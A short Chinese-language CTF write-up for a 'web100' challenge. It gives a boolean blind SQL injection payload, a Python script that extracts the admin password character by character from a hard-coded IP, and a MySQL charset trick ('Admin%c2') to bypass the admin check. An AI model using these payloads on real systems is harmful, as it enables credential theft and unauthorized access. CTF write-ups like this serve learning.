## web100 writeup 

bool 盲注出 passwd

payload: `admin'^!(mid((passwd)from(-1))='a')='1' from user;`

poc:

```python
#!/usr/bin/python
# coding:utf-8 

import requests 
import string

s = string.ascii_letters + string.digits
url = "http://39.108.154.135:8000?action=show"

def getPassword():
    username = "admin'^!(mid((passwd)from(-{pos}))='{passwd}')='1"
    passwd = ""
    for p in range(1,34):
        print(passwd)

        for i in s:
            passwdTmp = i + passwd
            data = {"username": username.format(pos=str(p), passwd=passwdTmp)}
            
            # print data
            res = requests.post(url ,data)
            if "admin" in res.text:
                passwd = passwdTmp
                break


if __name__ == "__main__":
    getPassword()
```

尝试用 sqlmap 注入结果注不出来。。。有师傅会的能提点一下吗

最后用 mysql 的字符编码问题,绕过对 admin 的判断

参考[Mysql字符编码利用技巧](https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html)

post
```
username=Admin%c2&passwd=注入出来的密码
```
